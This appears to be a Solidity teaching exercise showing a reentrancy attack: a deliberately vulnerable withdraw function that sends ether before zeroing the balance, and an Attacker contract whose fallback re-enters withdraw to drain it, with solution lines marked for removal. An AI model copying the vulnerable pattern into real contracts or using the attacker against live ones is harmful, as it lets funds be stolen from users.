pragma solidity 0.4.23;

import "../../payable/contracts/Balances.sol";


contract VulnerableBalances is Balances {
    function withdraw() public {
        if (msg.sender.call.value(balances[msg.sender])()) {
            balances[msg.sender] = 0;
        }
    }
}

contract Attacker {
    VulnerableBalances public vulnerable;

    constructor(VulnerableBalances _vulnerable) public payable {
        vulnerable = _vulnerable;
        // deposit initial balance
        vulnerable.deposit.value(address(this).balance)();     // @remove-line
    }

    // implement fallback function that calls back vulnerable withdraw
    function () public payable {                               // @remove-line
        vulnerable.withdraw();                                 // @remove-line
    }                                                          // @remove-line

    // call vulnerable.withdraw to start the exploit
    function start() public {
        vulnerable.withdraw();                                 // @remove-line
    }
}
